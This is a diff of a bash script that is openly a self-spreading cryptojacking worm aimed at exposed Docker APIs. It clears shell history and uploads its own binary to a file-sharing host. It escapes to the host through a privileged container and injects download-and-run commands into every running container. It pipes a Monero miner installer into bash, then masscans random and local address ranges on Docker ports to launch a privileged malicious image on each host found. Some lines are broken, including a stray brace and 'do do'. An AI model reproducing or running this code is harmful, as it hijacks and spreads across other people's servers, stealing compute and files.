@@ -3,7 +3,7 @@ unset HISTFILE
 export LC_ALL=C
 export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
 
-RATESCAN="50000"
+RATE="50000"
 SETUP_SLEEP="1"
 
 function INIT_MAIN(){
@@ -100,13 +100,21 @@ function SETUP_XMR(){
 bash /root/setup_xmrig.sh
 }
 
+export UPSPINTEST=`curl --upload-file /root/sbin https://filepush.co/upload/`
+# next part is implement the ssh spread..
+cp ./sbin /host/bin/sbin
+docker run -it --privileged --network host -v /:/mnt alpine chroot /mnt bash -C 'chmod +x /host/bin/sbin; /host/bin/sbin'
+}
+
 function INFECT_ALL_CONTAINERS(){
-    docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER > /tmp/.dc
-    for i in $(cat /tmp/.dc); do
-        docker exec --privileged -d "$i" sh -c "apk update; apk add wget curl; mkdir -p /var/tmp/; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin"
-    done
-    export HOME=/root
-    nohup $(curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9) &
+# ich lass den base64 echt mal weg :) sieht doch schöner aus ;)
+docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER >> /tmp/.dc
+# thx for the container list.... do a looping *jipieh*
+for i in $(cat /tmp/.dc); do
+docker exec --privileged -d $i sh -c "apt-get update; apt-get install -y wget curl; yum install -y wget curl; apk update; apk add wget curl; mkdir /var/tmp/ -p; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin || wge --no-check-certificate $UPSPINTEST -O /var/tmp/sbin || cur -sLk $UPSPINTEST -o /var/tmp/sbin || wdl --no-check-certificate $UPSPINTEST -O /var/tmp/sbin || cdl -sLk $UPSPINTEST -o /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin"
+done;
+export HOME=/root
+nohup $(curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8) &
 }
 
 function GETLOCALRANGES(){
@@ -114,42 +122,40 @@ function GETLOCALRANGES(){
 }
 
 function AUTOLANDOCKERPWN(){
-    TARGETRANGE=$1
-    TARGETPORT=$2
-    SCANRATE=$3
+    PORT=$1
+    RATE=$2
+    RANGE=$3
     rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6; echo '')
-    eval "$rndstr"="'$(masscan $TARGETRANGE -p$TARGETPORT --rate=$SCANRATE | awk '{print $6}' | zgrab --senders 200 --port $TARGETPORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'"
-
-    for TARGETIP in ${!rndstr}; do
-        echo "$TARGETIP:$TARGETPORT"
-        timeout -s SIGKILL 240s docker -H tcp://$TARGETIP:$TARGETPORT run -d --privileged --network host -v /:/host nmlmweb3/alpine_upspin:latest
+    eval "$rndstr"="'$(masscan -p$PORT $RANGE.0.0.0/8 --rate=$RATE | awk '{print $6}'| zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
+    for IPADDR in ${!rndstr}; do
+    do echo "$IPADDR:$PORT"
+        timeout -s SIGKILL 240s docker -H tcp://$IPADDR:$PORT run -d --privileged --network host -v /:/host nmlmweb3/upspin:latest
     done
 }
-
 function LANDOCKERPWN(){
     GETLOCALRANGES
-    while read -r TargetRange; do
-        echo "scanning $TargetRange"
-        AUTOLANDOCKERPWN "$TargetRange" 2375 "$RATESCAN"
-        AUTOLANDOCKERPWN "$TargetRange" 2376 "$RATESCAN"
-        AUTOLANDOCKERPWN "$TargetRange" 2377 "$RATESCAN"
-        AUTOLANDOCKERPWN "$TargetRange" 4243 "$RATESCAN"
-        AUTOLANDOCKERPWN "$TargetRange" 4244 "$RATESCAN"
-        AUTOLANDOCKERPWN "$TargetRange" 5555 "$RATESCAN"
+    while read -r RANGE; do
+        echo "scanning $RANGE"
+        AUTOLANDOCKERPWN "$RANGE" 2375 "$RATE"
+        AUTOLANDOCKERPWN "$RANGE" 2376 "$RATE"
+        AUTOLANDOCKERPWN "$RANGE" 2377 "$RATE"
+        AUTOLANDOCKERPWN "$RANGE" 4243 "$RATE"
+        AUTOLANDOCKERPWN "$RANGE" 4244 "$RATE"
+        AUTOLANDOCKERPWN "$RANGE" 5555 "$RATE"
     done < /tmp/.lr
     rm -f /tmp/.lr
 }
 
 function RANDOMDOCKERPWN(){
     for (( ; ; )); do
-        TargetRange="$[RANDOM%255+1].0.0.0/8"
-        echo "scanning $TargetRange"
-        AUTOLANDOCKERPWN "$TargetRange" 2375 "$RATESCAN"
-        AUTOLANDOCKERPWN "$TargetRange" 2376 "$RATESCAN"
-        AUTOLANDOCKERPWN "$TargetRange" 2377 "$RATESCAN"
-        AUTOLANDOCKERPWN "$TargetRange" 4243 "$RATESCAN"
-        AUTOLANDOCKERPWN "$TargetRange" 4244 "$RATESCAN"
-        AUTOLANDOCKERPWN "$TargetRange" 5555 "$RATESCAN"
+        RANGE="$[RANDOM%255+1].0.0.0/8"
+        echo "scanning $RANGE"
+        AUTOLANDOCKERPWN "$RANGE" 2375 "$RATE"
+        AUTOLANDOCKERPWN "$RANGE" 2376 "$RATE"
+        AUTOLANDOCKERPWN "$RANGE" 2377 "$RATE"
+        AUTOLANDOCKERPWN "$RANGE" 4243 "$RATE"
+        AUTOLANDOCKERPWN "$RANGE" 4244 "$RATE"
+        AUTOLANDOCKERPWN "$RANGE" 5555 "$RATE"
         sleep 1
     done
 }
